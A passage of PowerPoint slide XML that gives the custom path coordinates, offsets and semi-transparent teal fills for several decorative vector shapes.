                <a:lnTo>
                  <a:pt x="372287" y="1789899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="376694" y="1840699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="397789" y="1853399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="446049" y="1853399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="444271" y="1840699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="447421" y="1840699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="455256" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="483997" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="504418" y="1815299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="620674" y="1815299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="657161" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="696125" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="737336" y="1840699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="780516" y="1853399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="825461" y="1866099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="919581" y="1891499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="968273" y="1916899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1117981" y="1993099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1267942" y="2107400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1316850" y="2145500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1364805" y="2196300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1411566" y="2247100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1456893" y="2297900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1500530" y="2361400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1500530" y="2168842"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1465986" y="2145500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1410093" y="2094699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1300124" y="2018499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1246225" y="1993099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1193190" y="1954999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1141082" y="1929599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1090002" y="1891499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1040041" y="1866099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="991298" y="1840699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="943851" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="920826" y="1815299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="897788" y="1802599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="853211" y="1789899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="810209" y="1764499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="768870" y="1751799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="729272" y="1751799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="691515" y="1739099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="655701" y="1726399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="533552" y="1726399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="523214" y="1675599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="518604" y="1624799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="518668" y="1612099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="518744" y="1599399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="518807" y="1586699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="522859" y="1535899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="529831" y="1485099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="538810" y="1434299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="548843" y="1383499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="559003" y="1332699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="568363" y="1281899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="575983" y="1231099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="580923" y="1180299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="585089" y="1142199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="591248" y="1091399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="598792" y="1053299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="607136" y="1015199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="615708" y="964399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="623887" y="926299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="631113" y="875499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="636778" y="824699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="640295" y="773899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="641083" y="723099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="638543" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="632104" y="596099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="693305" y="583399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="859269" y="583399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="909447" y="596099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="957427" y="608799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1003427" y="621499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1047661" y="634199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1090371" y="646899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1131760" y="672299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1172070" y="697699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1211503" y="710399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1326807" y="786599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1364996" y="824699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1442300" y="875499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1481886" y="913599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522374" y="938999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1528203" y="1002499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1530477" y="1053299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1530477" y="758164"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1433207" y="697699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1349260" y="646899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1263370" y="596099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1219669" y="583399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1130744" y="532599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1085507" y="519899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1039736" y="494499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="851293" y="443699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="802805" y="443699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="753757" y="430999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="704151" y="430999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="653961" y="443699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="603186" y="443699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="551840" y="456399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="513867" y="456399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="497103" y="469099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="497001" y="494499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="496912" y="519899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="488048" y="570699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="479132" y="608799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="479044" y="621499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="478967" y="634199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="478891" y="646899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="478815" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="439280" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="400596" y="646899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="360883" y="646899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="318287" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="256311" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="259181" y="710399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="251206" y="748499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="241211" y="811999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="238023" y="875499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="156921" y="875499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="135496" y="888199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="119735" y="913599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="110388" y="938999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107759" y="989799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="102463" y="1053299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="95199" y="1104099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="86677" y="1154899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="77597" y="1205699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68656" y="1256499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60591" y="1307299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54076" y="1358099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="49834" y="1396199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48577" y="1434299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="50990" y="1472399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57810" y="1510499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="64719" y="1535899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="67424" y="1573999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="66522" y="1624799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="62661" y="1662899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="56476" y="1726399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48602" y="1777199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="39636" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30251" y="1891499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21043" y="1942299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12674" y="2005799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5753" y="2069299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="914" y="2120100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2145500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14605" y="2170900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37858" y="2196300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="110083" y="2196300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146951" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="222504" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="261226" y="2170900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="551548" y="2170900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="595998" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="641235" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="734187" y="2209000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="781926" y="2209000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="830529" y="2234400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="930402" y="2259800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="981722" y="2285200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1087170" y="2336000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1196530" y="2386800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1252715" y="2424900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1309928" y="2463000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1368183" y="2501100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1427505" y="2539200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1446733" y="2551900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1465008" y="2551900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1484591" y="2564600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1711032" y="2564600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1731556" y="2551900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1750568" y="2551900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1766849" y="2539200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1826539" y="2513800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1885950" y="2475700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2119338" y="2374100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2176310" y="2348700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2288171" y="2323300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2342934" y="2297900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2449817" y="2272500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2501811" y="2272500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2651226" y="2234400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2744749" y="2234400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2789504" y="2221700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2874657" y="2221700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2914942" y="2209000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3148444" y="2209000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3172015" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3188995" y="2158200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3197123" y="2132800"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6664452" y="2820923"/>
            <a:ext cx="307975" cy="364490"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="307975" h="364489">
                <a:moveTo>
                  <a:pt x="153924" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="137233" y="52785"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="111959" y="95963"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79638" y="130960"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="41806" y="159203"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="182117"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43866" y="212165"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79784" y="240773"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="109161" y="272570"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="133404" y="312182"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="153924" y="364236"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="168639" y="313657"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190146" y="272149"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="219687" y="237719"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258506" y="208373"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="307848" y="182117"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="263993" y="155472"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="226545" y="120225"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="195632" y="80089"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="171382" y="38776"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="153924" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9073895" y="3404615"/>
            <a:ext cx="306705" cy="364490"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="306704" h="364489">
                <a:moveTo>
                  <a:pt x="153161" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="126577" y="50651"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="98554" y="92762"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68506" y="127759"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35850" y="157069"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="182118"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="49981" y="205337"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="87032" y="238030"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114409" y="277325"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="135367" y="320350"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="153161" y="364236"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="171248" y="315388"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="191786" y="274966"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="218596" y="240755"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="255501" y="210543"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="306324" y="182118"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258878" y="160117"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="217480" y="131600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="184489" y="95871"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162263" y="52236"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="153161" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7788208" y="3130295"/>
            <a:ext cx="114300" cy="401320"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="114300" h="401320">
                <a:moveTo>
                  <a:pt x="58868" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="37401" y="5925"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20958" y="19018"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9754" y="36254"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4004" y="54609"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9807" y="105198"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9366" y="152531"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5623" y="198453"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1520" y="244808"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="293443"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4004" y="346201"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20101" y="384651"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="58868" y="400812"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76477" y="395547"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="94586" y="382127"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="108552" y="364396"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="113732" y="346201"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106085" y="286811"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="104757" y="238995"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107302" y="197310"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="111276" y="156313"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114234" y="110561"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="113732" y="54609"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="112499" y="35254"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="100539" y="18446"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="81460" y="6068"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="58868" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7791140" y="2766060"/>
            <a:ext cx="115570" cy="254635"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="115570" h="254635">
                <a:moveTo>
                  <a:pt x="55935" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="33397" y="2905"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15835" y="15430"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4607" y="33861"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1071" y="54482"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1714" y="95190"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="158317"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1071" y="200025"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15882" y="237553"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="55935" y="254507"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="75241" y="248281"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="92178" y="237077"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="104709" y="220968"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="110799" y="200025"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="110085" y="153906"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="113085" y="117109"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="110799" y="54482"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96273" y="18192"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79063" y="4548"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="55935" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8196276" y="3469489"/>
            <a:ext cx="170180" cy="391160"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="170179" h="391160">
                <a:moveTo>
                  <a:pt x="107801" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="88917" y="7929"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73606" y="22288"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="63295" y="40790"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57505" y="101550"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44240" y="151200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12288" y="234461"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2103" y="276713"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1446" y="325143"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="346225"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7209" y="365593"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21538" y="381150"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="41451" y="390802"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44499" y="389786"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47928" y="390929"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="52373" y="390802"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69300" y="390425"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="83774" y="382357"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96200" y="368478"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106983" y="350670"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="115542" y="299004"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="127110" y="252255"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="139955" y="208018"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152346" y="163886"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162549" y="117455"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="168832" y="66317"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="170082" y="41344"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162831" y="21121"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="148580" y="7113"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="128827" y="785"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107801" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8307451" y="3034815"/>
            <a:ext cx="156845" cy="327025"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="156845" h="327025">
                <a:moveTo>
                  <a:pt x="53909" y="325096"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="45084" y="325096"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47117" y="326874"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="50926" y="325604"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="53909" y="325096"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="156845" h="327025">
                <a:moveTo>
                  <a:pt x="112826" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="89927" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="70865" y="8643"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="56372" y="23915"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47244" y="43791"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42915" y="90945"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30815" y="128694"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16154" y="164455"/>
